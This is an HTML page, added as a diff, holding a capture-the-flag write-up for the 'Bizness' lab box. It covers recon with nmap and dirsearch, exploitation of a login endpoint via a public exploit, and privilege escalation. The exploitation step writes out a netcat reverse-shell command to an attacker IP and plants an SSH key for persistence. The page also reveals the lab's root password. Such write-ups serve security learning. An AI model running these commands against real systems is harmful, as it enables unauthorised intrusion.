@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width" initial-scale="1.0">
+        <title>Bizness</title>
+        <link rel="stylesheet" href="style3.css">
+    </head>
+    <body>
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsftl35uZBV9wYNE66Qv44yHgWsTC3ugTLxw&s" alt="Logo" class="logo">
+            <h1>Bizness Reportings</h1>
+            </div>
+            <hr>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*v3ZeEj9EfsQo_wnQ68cfaw.png">
+            <p class="paragraph">
+                Today I want to share a write-up about how to solve the Bizness box.<br><br>
+                Let’s get started.
+            </p>
+            <h2>Recon:</h2>
+            <p class="script-container">
+                nmap -sV -sC 10.10.11.252
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*CghAj-JSgCTDrEOQk6IYfg.png">
+            <p class="paragraph">
+                Okay, now we have a website running on port 80,443<br><br>
+                We need now to add a domain in this path /etc/hosts by this command.
+                <p class="script-container">
+                    echo "10.10.11.252   bizness.htb" | sudo tee -a /etc/hosts
+                </p>
+                Now we need to visit the website
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ILe-MGKaZciqH-1RK1IhGA.png">
+            <p class="paragraph">
+                When searching on the website I found something interesting.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:452/format:webp/1*UW3qpZmr4eslEM6vWwFqvQ.png">
+            <p class="paragraph">
+                Okay, deep dig into the website, I’ll use ‘dirsearch’.
+                <p class="script-container">
+                    dirsearch -u "https://bizness.htb/"
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*mFhUzl_vqCR5SBiL14mgsg.png">
+            <p class="paragraph">
+                Now, we need to visit this EndPoint /control/login to access the login page.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Nj3ZYjYSHE_7XuTQSYe93Q.png">
+            <p class="paragraph">
+                Let’s type default credentials like admin, admin root, and root but nothing.<br><br>
+                Okay, I will search for this version and maybe find a public exploit.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*C92OvwQ2XnyvDERL79Diow.png">
+            <h2>Exploitation:</h2>
+            <p class="script-container">
+                python3 exploit.py --url "https://bizness.htb/" --cmd "nc Your_IP 9001 -e /bin/bash" # To send malicious payload.<br>
+                nc -nvlp 9001 # to run listener on you machine
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*APG63vE8xAO2YxexNaf_VA.png">
+            <p class="paragraph">
+                We need the new connection stable so I will use SSH to do that.
+                <p class="script-container">
+                    ssh-keygen # Generating public/private keys.<br>
+                    python3 -m http.server 8000 # Run simple server on your machine.
+                </p>
+                Run a simple server on your machine and upload the public key on the target.
+                <p class="script-container">
+                    ssh -i id_rsa ofbiz@bizness.htb # Use private key to access machine
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*YoelYyIwbd4dblY6learfw.png">
+            <h2>Privilege Escalation:</h2>
+            <p class="paragraph">
+                After a long search, I don't find anything interesting, So I try to search in website files and maybe find interesting in the source code.<br><br>
+                Here, I found an interesting file.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*WfjtC_4dEZh5H9UZMkEAcw.png">
+            <p class="paragraph">
+                And this
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*k4NbSffJfQsvZY-VAzvg-w.png">
+            <p class="paragraph">
+                After cracking this you can access password root ==> {monkeybizness}.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*kb3m_ocnr-n5sjU41qB0mw.png">
+            <p class="paragraph">
+                Thanks for reading.
+            </p>
+    </body>
+    <footer class="footer">
+        <p>&copy; 2024 <a href="https://Iam.Gh0st.Net">Iam.Gh0st.net</a> All rights reserved.</p>
+    </footer>
+</html>
